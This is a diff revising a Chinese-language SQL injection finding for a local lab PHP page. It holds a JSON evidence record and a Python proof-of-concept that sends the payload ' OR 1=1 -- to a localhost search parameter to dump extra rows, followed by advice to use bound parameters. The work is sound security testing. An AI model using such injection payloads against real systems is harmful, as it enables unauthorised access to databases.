@@ -5,73 +5,69 @@
   "vulnerability_type": "SQL注入",
   "locations": ["F01:0007", "F01:0010", "F01:0011"],
   "evidence": {
-    "source": "F01:0007 外部 GET 参数 q 直接取自 $_GET['q']",
-    "flow": "F01:0010 将 $q 拼接到 LIKE 模式字符串中，F01:0011 将该动态 SQL 传给 $db->query",
-    "guard": "无效：未使用预处理绑定参数、mysqli_real_escape_string 或白名单；LIKE 的 %/_ 通配符语义本身不是注入证据，但单引号可改变 SQL 结构",
-    "sink": "F01:0011 $db->query($sql) 执行包含外部输入的动态 SQL"
+    "source": "F01:0007 从 $_GET['q'] 读取外部输入并赋给 $q，入口可达。",
+    "flow": "F01:0010 将 $q 直接拼接到 LIKE 模式 SQL 字符串中；F01:0011 将拼接后的 SQL 交给 $db->query 执行。",
+    "guard": "无效：输入路径未见 prepare/bind、mysqli_real_escape_string 或白名单；LIKE 的 %/_ 通配符语义本身不构成注入防护。",
+    "sink": "F01:0011 $db->query($sql) 是实际 SQL 执行点。"
   },
   "prerequisites": [
-    "PHP + MariaDB（MySQLi 接口）运行，公共 db_connect.php 已提供可用的 $db 连接",
-    "lab_people 表存在并预置 1 Alice、2 Bob、3 Carol",
-    "入口 http://127.0.0.1:4280/lab_cases/S005/index.php 可访问，GET 参数 q 无需登录"
+    "本地入口 http://127.0.0.1:4280/lab_cases/S005/index.php 可达",
+    "common/db_connect.php 已正确提供已连接的 mysqli 变量 $db",
+    "lab_people 表存在且预置 1 Alice、2 Bob、3 Carol",
+    "无需登录"
   ],
   "missing_context": [
-    "未提供 common/db_connect.php 的具体实现；但当前页面使用 $db->query 直接执行拼接语句，已足以判定该查询路径存在注入条件"
+    "common/db_connect.php 的实际实现未包含在输入包中，未核对其连接细节；按 runtime_context 假定其提供已连接的 $db。"
   ],
   "poc_generated": true,
   "poc_language": "python3",
-  "poc_instructions": "保存为 s005_poc.py，运行 python3 s005_poc.py。脚本仅访问 127.0.0.1:4280，先请求普通输入 q=Alice，再请求不修改数据的测试输入 q=' OR 1=1 -- （脚本自动 URL 编码）。预期普通响应仅包含 Alice/ID 1，不包含 Bob/Carol；测试响应应包含 ID 1 Alice、ID 2 Bob、ID 3 Carol。成功条件是测试响应新增 Bob/Carol 记录且普通响应不包含它们，不能以 HTTP 200 作为成功条件。失败时检查入口可访问性、db_connect.php 连接、lab_people 表数据及 URL 编码后的注释语法前提。"
+  "poc_instructions": "运行 python3 poc.py。脚本仅请求 127.0.0.1:4280，先以普通输入 q=Alice 查询，预期仅返回 Alice；再以测试输入 q=' OR 1=1 -- （脚本自动 URL 编码）查询，预期返回 Alice、Bob、Carol。比较解析到的 ID/name 记录，不要以 HTTP 200 作为成功条件。失败时检查入口可达、common/db_connect.php 的 $db、lab_people 表及预置数据。"
 }
 ```
 
 ```python
-#!/usr/bin/env python3
+import re
 import urllib.parse
 import urllib.request
 
-BASE_URL = "http://127.0.0.1:4280/lab_cases/S005/index.php"
+BASE = "http://127.0.0.1:4280/lab_cases/S005/index.php"
+ROW_RE = re.compile(r'<p>ID\s+(\d+)：([^<]*)</p>')
 
-def fetch(q: str):
-    url = BASE_URL + "?" + urllib.parse.urlencode({"q": q})
-    with urllib.request.urlopen(url, timeout=10) as resp:
+
+def fetch(q):
+    url = BASE + "?" + urllib.parse.urlencode({"q": q})
+    with urllib.request.urlopen(url, timeout=5) as resp:
         body = resp.read().decode("utf-8", "replace")
-        return resp.status, body
+    rows = [(int(i), name) for i, name in ROW_RE.findall(body)]
+    return url, rows
+
 
 def main():
-    ordinary_q = "Alice"
+    normal_q = "Alice"
     test_q = "' OR 1=1 -- "
 
-    ordinary_status, ordinary_body = fetch(ordinary_q)
-    test_status, test_body = fetch(test_q)
+    normal_url, normal_rows = fetch(normal_q)
+    test_url, test_rows = fetch(test_q)
 
-    print(f"普通请求 q={ordinary_q!r}: HTTP {ordinary_status}")
-    print(f"测试请求 q={test_q!r}: HTTP {test_status}")
+    print("normal url:", normal_url)
+    print("normal rows:", normal_rows)
+    print("test url:", test_url)
+    print("test rows:", test_rows)
 
-    ordinary_has_alice = "Alice" in ordinary_body
-    ordinary_has_bob = "Bob" in ordinary_body
-    ordinary_has_carol = "Carol" in ordinary_body
+    normal_ok = normal_rows == [(1, "Alice")]
+    test_names = {name for _, name in test_rows}
+    test_ok = {"Alice", "Bob", "Carol"}.issubset(test_names)
 
-    test_has_alice = "Alice" in test_body
-    test_has_bob = "Bob" in test_body
-    test_has_carol = "Carol" in test_body
+    print("normal_expected_only_Alice:", normal_ok)
+    print("test_expected_three_preset_people:", test_ok)
 
-    print("普通响应包含: Alice=%s Bob=%s Carol=%s" % (
-        ordinary_has_alice, ordinary_has_bob, ordinary_has_carol
-    ))
-    print("测试响应包含: Alice=%s Bob=%s Carol=%s" % (
-        test_has_alice, test_has_bob, test_has_carol
-    ))
+    if not (normal_ok and test_ok):
+        print("检查：入口可达、common/db_connect.php 的 $db、lab_people 表与 1 Alice/2 Bob/3 Carol 数据。")
+        raise SystemExit(1)
 
-    ordinary_ok = ordinary_has_alice and not ordinary_has_bob and not ordinary_has_carol
-    test_ok = test_has_alice and test_has_bob and test_has_carol
-
-    if ordinary_ok and test_ok:
-        print("观察结果符合 SQL 注入验证预期：普通输入仅返回 Alice，测试输入返回 Alice/Bob/Carol。")
-    else:
-        print("未达到预期。请检查入口、db_connect.php、lab_people 表数据、URL 编码及 MySQL 注释语法前提；不要仅凭 HTTP 200 判定成功。")
 
 if __name__ == "__main__":
     main()
-```
 
-防护建议（未验证）：对 `$q` 使用 `mysqli` 预处理并绑定参数，例如在固定 SQL 中用 `LIKE CONCAT('%', ?, '%')` 绑定用户输入，避免将外部输入拼接到 SQL 字符串。
+# 防护建议：使用预处理并绑定参数，例如 LIKE CONCAT('%', ?, '%')，不要把 q 直接拼入 SQL。
+```
